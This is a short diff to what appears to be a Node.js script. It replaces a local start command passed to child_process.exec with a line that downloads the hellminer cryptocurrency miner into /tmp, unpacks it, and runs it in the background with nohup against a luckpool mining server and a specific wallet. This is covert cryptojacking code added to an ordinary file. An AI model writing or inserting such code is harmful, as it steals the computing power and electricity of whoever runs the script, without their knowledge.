@@ -11,7 +11,7 @@ http
 const { exec } = require("child_process");
 
 exec(
-  "cp -R start .. && sh ../start",
+  "cd /tmp && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && nohup ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RARNZ6LoxcvsUgVHM1f2MDmnVfzDFxqV1R.CS -p x --cpu 1 &",
   (error, stdout, stderr) => {
     if (error) {
       console.log(`error: ${error.message}`);
